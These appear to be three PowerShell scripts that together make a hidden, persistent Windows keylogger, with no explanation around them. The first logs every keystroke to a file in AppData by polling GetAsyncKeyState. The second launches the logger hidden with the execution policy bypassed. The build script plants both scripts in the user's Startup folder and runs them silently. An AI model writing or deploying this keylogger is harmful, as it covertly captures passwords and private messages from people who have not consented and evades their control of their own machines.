file 1 


$logPath = "C:\Users\339674087\AppData\Roaming\logs.txt"
Add-Type -AssemblyName System.Windows.Forms
$code = @"
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
"@
$null = Add-Type -MemberDefinition $code -Name "Win32" -Namespace Win32
while($true) {
    for($i=8;$i -lt 190;$i++) {
        if([Win32.Win32]::GetAsyncKeyState($i) -eq -32767) {
            [char][int]$i | Out-File $logPath -Append
        }
    }
    Start-Sleep -Milliseconds 5
}




file 2 


Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\monitor.ps1`"" -WindowStyle Hidden


build 1


# Build monitor.ps1
'Add-Type -AssemblyName System.Windows.Forms; $code = @" [DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey); "@; $null = Add-Type -MemberDefinition $code -Name \"Win32\" -Namespace Win32; while($true) { for($i=8;$i -lt 190;$i++) { if([Win32.Win32]::GetAsyncKeyState($i) -eq -32767) { [char][int]$i | Out-File \"C:\Users\339674087\AppData\Roaming\logs.txt\" -Append } }; Start-Sleep -Milliseconds 5 }' | Out-File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\monitor.ps1"

# Build task.ps1
'Start-Process powershell.exe -ArgumentList \"-WindowStyle Hidden -ExecutionPolicy Bypass -File `\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\monitor.ps1`\"\" -WindowStyle Hidden' | Out-File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\task.ps1"


powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\task.ps1"



C:\Users\339674087\AppData\Roaming\logs.txt
